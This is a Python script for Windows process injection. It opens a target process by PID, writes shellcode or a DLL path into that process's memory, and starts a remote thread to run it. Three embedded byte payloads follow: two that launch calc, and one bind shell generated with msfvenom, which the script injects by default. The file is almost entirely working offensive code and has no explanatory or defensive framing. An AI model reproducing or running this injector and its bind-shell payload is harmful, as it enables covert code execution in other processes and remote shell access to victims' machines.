#!/usr/bin/env python
# Author: 
import sys
from ctypes import *

PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )
MEM_COMMIT = 0x00001000
kernel32 = windll.kernel32
	
def inject_sc_to_pid(pid,sc):
	code_size = len(sc)
	if code_size == 0:
		print '[-] Shellcode size is zero, did you forget to add shellcode?\n'
	# Get a handle to the process we are injecting into.
	h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
	if not h_process:
		print '[-] Couldn\'t acquire a handle to PID: {0}'.format(pid)
		sys.exit(0)
	# Allocate some space for the shellcode
	#arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
	arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	print '[+] Memory allocated at 0x{0:8x}'.format(arg_address) 
	# Write out the shellcode
	written = c_int(0)
	kernel32.WriteProcessMemory(h_process, arg_address, sc, code_size, byref(written))
	# Now we create the remote thread and point its entry routine
	# to be head of our shellcode
	thread_id = c_ulong(0)
	if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
		print '[-] Failed to inject shellcode. Exiting.'
		sys.exit(0)
	print '[+] Remote thread created with a thread ID of: 0x{0:8x}'.format(thread_id.value)
	print '[+] Process {0} should have spawned the shellcode'.format(pid)

def inject_dll_to_pid(pid, dll_path):
	# https://docs.microsoft.com/en-us/windows/desktop/memory/memory-protection-constants
	dll_len = len(dll_path)

	# Get a handle to the process we are injecting into.
	h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
	if not h_process:
	    print '[-] Couldn\'t acquire a handle to PID: {0:8x}\n'.format(pid)
	    sys.exit(0)

	# Allocate some space for the DLL path
	arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

	# Write the DLL path into the allocated space
	written = c_int(0)
	kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

	# We need to resolve the address for LoadLibraryA
	h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
	h_loadlib = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")

	# Now we try to create the remote thread, with the entry point set
	# to LoadLibraryA and a pointer to the DLL path as its single parameter
	thread_id = c_ulong(0)

	# https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread
	if not kernel32.CreateRemoteThread(h_process, 
		None, 
		0, 
		h_loadlib,
		arg_address,
		0,
		byref(thread_id)):
	    print '[-] Failed to inject the DLL. Exiting.'
	    sys.exit(0)
	# Success
	print '[+] Remote thread with ID 0x%08{0} created.'.format(thread_id.value)



# returns shellcode that executes x64 calc
def payload_x64_calc():
	buf =  ""
	buf += "\xeb\x27\x5b\x53\x5f\xb0\xd4\xfc\xae\x75\xfd\x57\x59"
	buf += "\x53\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66"
	buf += "\x81\x3f\xd7\x0b\x74\x07\x80\x3e\xd4\x75\xea\xeb\xe6"
	buf += "\xff\xe1\xe8\xd4\xff\xff\xff\x07\xd4\xfb\x4f\x84\xe3"
	buf += "\xf7\xef\xc7\x07\x07\x07\x46\x56\x46\x57\x55\x56\x51"
	buf += "\x4f\x36\xd5\x62\x4f\x8c\x55\x67\x4f\x8c\x55\x1f\x4f"
	buf += "\x8c\x55\x27\x4f\x8c\x75\x57\x4f\x08\xb0\x4d\x4d\x4a"
	buf += "\x36\xce\x4f\x36\xc7\xab\x3b\x66\x7b\x05\x2b\x27\x46"
	buf += "\xc6\xce\x0a\x46\x06\xc6\xe5\xea\x55\x46\x56\x4f\x8c"
	buf += "\x55\x27\x8c\x45\x3b\x4f\x06\xd7\x8c\x87\x8f\x07\x07"
	buf += "\x07\x4f\x82\xc7\x73\x60\x4f\x06\xd7\x57\x8c\x4f\x1f"
	buf += "\x43\x8c\x47\x27\x4e\x06\xd7\xe4\x51\x4f\xf8\xce\x46"
	buf += "\x8c\x33\x8f\x4f\x06\xd1\x4a\x36\xce\x4f\x36\xc7\xab"
	buf += "\x46\xc6\xce\x0a\x46\x06\xc6\x3f\xe7\x72\xf6\x4b\x04"
	buf += "\x4b\x23\x0f\x42\x3e\xd6\x72\xdf\x5f\x43\x8c\x47\x23"
	buf += "\x4e\x06\xd7\x61\x46\x8c\x0b\x4f\x43\x8c\x47\x1b\x4e"
	buf += "\x06\xd7\x46\x8c\x03\x8f\x4f\x06\xd7\x46\x5f\x46\x5f"
	buf += "\x59\x5e\x5d\x46\x5f\x46\x5e\x46\x5d\x4f\x84\xeb\x27"
	buf += "\x46\x55\xf8\xe7\x5f\x46\x5e\x5d\x4f\x8c\x15\xee\x50"
	buf += "\xf8\xf8\xf8\x5a\x4f\xbd\x06\x07\x07\x07\x07\x07\x07"
	buf += "\x07\x4f\x8a\x8a\x06\x06\x07\x07\x46\xbd\x36\x8c\x68"
	buf += "\x80\xf8\xd2\xbc\xf7\xb2\xa5\x51\x46\xbd\xa1\x92\xba"
	buf += "\x9a\xf8\xd2\x4f\x84\xc3\x2f\x3b\x01\x7b\x0d\x87\xfc"
	buf += "\xe7\x72\x02\xbc\x40\x14\x75\x68\x6d\x07\x5e\x46\x8e"
	buf += "\xdd\xf8\xd2\x64\x66\x6b\x64\x29\x62\x7f\x62\x07\xd7"
	buf += "\x0b"
	return buf



def payload_x86_calc_shikata():
	buf =  ""
	buf += "\xda\xcb\xd9\x74\x24\xf4\x5b\xb8\x21\xd4\x3e\xad\x2b"
	buf += "\xc9\xb1\x4c\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2"
	buf += "\xd4\x0d\xd0\x17\x72\x55\xc2\x15\xa3\xdd\x39\x12\x0b"
	buf += "\x2d\x8b\x6b\xed\xd2\xcb\x88\xc0\x84\xd8\x93\x16\xcd"
	buf += "\xd2\x1b\x5a\x91\xd8\x97\xa9\xd5\x5e\x02\x4a\x7d\x14"
	buf += "\x41\x3a\xeb\xe8\xf5\x71\x6e\x35\x24\x00\x3a\xe7\x8f"
	buf += "\x0e\xad\xc8\x35\xbf\x52\xb9\x0d\xd1\x08\x6e\x9a\x7d"
	buf += "\x63\x3c\x6f\x92\x4e\xe2\x49\x1e\xf4\x96\x8f\xd7\x0f"
	buf += "\x5b\xd5\xe0\x7c\xcc\x92\x07\x7b\x76\x00\xcf\xb6\x2c"
	buf += "\x0c\xbb\x3a\xb2\x11\xf5\x44\xc7\x06\xd5\xb9\xf0\x9a"
	buf += "\x30\xf5\x17\x9a\x41\x4f\x6f\xba\xbb\x45\xc4\x62\x4c"
	buf += "\xf2\x17\xc0\xf1\xc2\xa9\x13\x4b\xad\xe6\xc1\xbd\xac"
	buf += "\xc0\x0d\xd4\x85\x5a\x74\x3d\xf1\x9d\xb6\x6d\xe0\x36"
	buf += "\x12\x91\x86\x6e\xfa\x23\xec\xf3\xce\x82\xc9\x33\x82"
	buf += "\x68\x6e\xf8\x02\xa0\x82\x37\x1a\x48\xb2\xf0\x00\xa8"
	buf += "\xd3\xc2\x7c\x88\x30\x0d\x33\x99\xf6\x69\xf5\x98\x9d"
	buf += "\xac\x87\x2b\xcc\x90\xce\xc5\x25\x0e\xef\x4b\x21\x81"
	buf += "\x27\x01\x05\x31\x8f\xa4\x02\xfb\xfa\x53\x2a\x41\xeb"
	buf += "\x49\x89\x4f\x83\x0f\x88\xe4\xe2\x0f\xed\x6c\x0c\xb5"
	buf += "\xa1\x44\x7b\xae\x3e\x58\x72\xb6\x8b\x2f\x42\xc3\xf5"
	buf += "\x6b\xd4\x48\xb4\x32\xf9\x8f\x8f\xa8\xb6\x94\xf0\x35"
	buf += "\x3d\xd4\x1a\x80\xe7\xb5\x60\x8a\x0b\xd1\xd6\x53\x76"
	buf += "\xf1\x25\xda\x2c\xd8\xde\x39\xa9\xfd\x83\x0b\xac\xf8"
	buf += "\x32\xee\x02\x74\x7c\xcb\xf2\xc3\x79\xf6\x13\x5b\xe0"
	buf += "\x74\xe0\x04\x68\xdb\xdc\x21\x81\x84\x7f\x48\x24\x2a"
	buf += "\x1e\xae\xe6\x97\x54"
	return buf

# c:\Ruby24-x64\bin\ruby.exe  msfvenom -a x86 -p windows/shell_bind_tcp LHOST=127.0.0.2 LPORT=5005  -f python
def payload_windows_bindshell():
	buf =  ""
	buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
	buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
	buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
	buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
	buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
	buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
	buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
	buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
	buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
	buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
	buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
	buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
	buf += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
	buf += "\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"
	buf += "\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x13\x8d\x89"
	buf += "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57"
	buf += "\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
	buf += "\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63"
	buf += "\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59"
	buf += "\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24"
	buf += "\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56"
	buf += "\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e"
	buf += "\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
	buf += "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
	buf += "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
	buf += "\x53\xff\xd5"
	return buf

def main():
	#print 'Argv[1] {0}'.format(sys.argv[1])

	if len(sys.argv[1:]) > 2 or len(sys.argv[1:]) < 1:
		print '[-] {0}: Need only {1} arguments to inject a dll in, for injecting shellcode just the pid\n'.format(sys.argv[0],2)
		print 'Usage: {0} <PID> <DLL Path>\n'.format(sys.argv[0])
		print '      OR \n'
		print 'Usage: {0} <PID>\n'.format(sys.argv[0])
		sys.exit(-1)
	else:
		if len(sys.argv[1:]) == 1:
			#inject_sc_to_pid(sys.argv[1], payload_x64_calc())
			inject_sc_to_pid(sys.argv[1],payload_windows_bindshell())
			return
	# 1st argument - PID to inject to
	# 2nd argument - DLL to inject into the Process
	inject_dll_to_pid(sys.argv[1],sys.argv[2])
	return

if __name__ == '__main__':
	main()